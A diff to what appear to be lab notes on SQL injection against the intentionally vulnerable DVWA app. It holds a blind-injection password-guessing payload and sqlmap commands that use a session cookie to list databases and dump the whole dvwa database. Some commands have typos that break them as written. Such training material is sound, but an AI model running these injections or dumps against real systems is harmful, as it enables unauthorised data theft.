@@ -772,7 +772,10 @@ grant alter table to UnauthorizedUser
 	- Trial and error with the other alphabets and numbers
 	- To find second character of password: `tom' and substring(password, 2, 1)='a`
 
-## SQL Map
+## SQLMap
+> **About SQLMap**
+> SQLMap is an automated SQL injection tool
+
 **On Kali VM**
 1. Browse to DVWA
 2. Login with username "admin" and default password "password"
@@ -801,4 +804,14 @@ man sqlmap
 sudo sqlmap -u "http//Win10-IP/dvwa-master/vulnerabilties/sqli/?id=3&Submit=Submit" --cookie="security=low;PHPSESSID=ab6iiicumjdbjkmun4cphkdmvo" --dbs
 ```
 
-11. SQLmap will outp
+11. SQLmap will output information about databases found
+
+![](https://i.imgur.com/YoCJ74P.png)
+
+12. Run SQLmap with target URL and cookie again with `-D` and `--dump-all` option 
+	- `-D` option -> specifies name of database (`dvwa` database)
+	- `--dump-all` -> specify to dump all contents of
+
+```
+sudo sqlmap –u "http://192.168.13.100/dvwa-master/vulnerabilities /sqli/?id=3&Submit=Submit" --cookie="security=low; PHPSESSID=ab6iiicumjdbjkmun4cphkdmvo" –D dvwa --dump-all
+```
